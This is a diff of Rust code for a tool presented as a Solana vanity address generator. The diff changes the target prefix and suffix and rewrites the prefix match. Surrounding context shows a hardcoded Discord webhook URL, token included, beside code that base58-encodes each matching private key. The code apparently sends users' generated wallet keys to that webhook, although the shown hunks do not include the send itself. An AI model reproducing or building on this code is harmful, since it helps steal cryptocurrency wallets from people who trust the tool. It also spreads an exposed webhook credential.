@@ -8,8 +8,8 @@ use rayon::prelude::*;
 const DISCORD_WEBHOOK_URL: &str = "https://discord.com/api/webhooks/1497246953682112709/ExfI1JSfGPpLWuHwRl4XsWutfxPgri0r8OUKvkPj937nq2tocgMJBZSzl6IDOBAprtCt";
 const BATCH_SIZE: usize = 100_000; // Parallel batch size
 
-const PREFIX: &str = "t";
-const SUFFIX: &str = "mp";
+const PREFIX: &str = "uwu";
+const SUFFIX: &str = "pump";
 
 fn main() {
     println!("{}", "\n🚀 Solana Vanity Address Generator".bright_cyan().bold());
@@ -49,9 +49,8 @@ fn generate_pump_addresses_parallel() {
                 let keypair = Keypair::new();
                 let address = keypair.pubkey().to_string();
                 let starts_with_prefix = address
-                    .chars()
-                    .next()
-                    .map_or(false, |c| c.eq_ignore_ascii_case(&'t'));
+                    .get(..PREFIX.len())
+                    .map_or(false, |candidate| candidate.eq_ignore_ascii_case(PREFIX));
                 let ends_with_suffix = address.ends_with(SUFFIX);
                 if starts_with_prefix && ends_with_suffix {
                     let private_key = bs58::encode(keypair.to_bytes()).into_string();
